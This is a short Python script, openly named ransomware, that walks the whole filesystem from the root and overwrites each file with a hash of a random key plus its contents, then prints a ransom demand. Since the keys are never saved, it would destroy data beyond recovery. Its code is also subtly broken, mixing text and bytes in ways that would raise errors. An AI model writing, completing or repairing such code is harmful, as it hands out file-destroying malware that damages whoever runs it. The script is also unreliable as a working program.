import os
import hashlib
import pickle
import time
import random
import string
import sys
import threading

class Ransomware:
    def __init__(self):
        self.files_encrypted = 0
        self.total_files = 0
        self.lock = threading.Lock()

    def generate_key(self):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))

    def encrypt_file(self, file_path):
        with open(file_path, 'rb') as f:
            data = f.read()
        key = self.generate_key()
        encrypted_data = hashlib.sha256((key + data).encode()).digest()
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
        return key

    def display_status(self):
        with self.lock:
            print(f"Files encrypted: {self.files_encrypted} ({self.files_encrypted / self.total_files * 100:.2f}%)")
            sys.stdout.flush()

    def encrypt_files(self):
        self.total_files = 0
        self.files_encrypted = 0
        for root, dirs, files in os.walk('/'):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path):
                    self.total_files += 1
                    threading.Thread(target=self.encrypt_file, args=(file_path,)).start()
                    self.files_encrypted += 1
                    self.display_status()
                    time.sleep(0.1)

    def main(self):
        print("Ransomware activated!")
        self.encrypt_files()
        time.sleep(1)
        print("All files encrypted. Pay the ransom to get the decryption key.")

if __name__ == "__main__":
    ransomware = Ransomware()
    ransomware.main()
